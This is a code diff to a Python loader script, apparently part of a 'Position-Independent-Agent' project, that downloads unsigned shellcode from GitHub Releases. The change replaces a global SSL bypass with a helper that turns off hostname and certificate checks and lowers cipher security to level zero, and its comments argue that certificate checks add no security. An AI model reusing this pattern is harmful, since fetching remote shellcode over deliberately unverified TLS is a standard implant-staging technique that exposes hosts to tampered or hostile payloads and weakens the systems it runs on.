@@ -37,13 +37,9 @@ try:
 except ImportError:
     from urllib2 import Request, urlopen, HTTPError
 
-# Disable SSL verification globally — we download unsigned shellcode from
-# public GitHub Releases, so cert checks add no security and break on hosts
-# with outdated CA stores (Windows 7, Solaris, etc.).
-try:
-    ssl._create_default_https_context = ssl._create_unverified_context
-except AttributeError:
-    pass  # Python < 2.7.9 / 3.4.3: verification not enabled anyway
+# SSL verification is disabled at download time via _make_ssl_context() —
+# we download unsigned shellcode from public GitHub Releases, so cert
+# checks add no security and break on hosts with outdated CA stores.
 
 REPO = "mrzaxaryan/Position-Independent-Agent"
 
@@ -145,9 +141,30 @@ def get_host():
 # Download from GitHub Releases
 # =============================================================================
 
+def _make_ssl_context():
+    """Create a permissive SSL context for maximum compatibility."""
+    try:
+        proto = getattr(ssl, 'PROTOCOL_TLS', None) or ssl.PROTOCOL_SSLv23
+        ctx = ssl.SSLContext(proto)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        try:
+            ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
+        except ssl.SSLError:
+            pass
+        return ctx
+    except Exception:
+        return None
+
+
 def _http_get(url):
     req = Request(url, headers={"User-Agent": "PIA-Loader/1.0"})
-    resp = urlopen(req)
+    ctx = _make_ssl_context()
+    try:
+        resp = urlopen(req, context=ctx) if ctx else urlopen(req)
+    except TypeError:
+        # Python < 2.7.9 / 3.4.3: urlopen doesn't accept context=
+        resp = urlopen(req)
     try:
         return resp.read()
     finally:
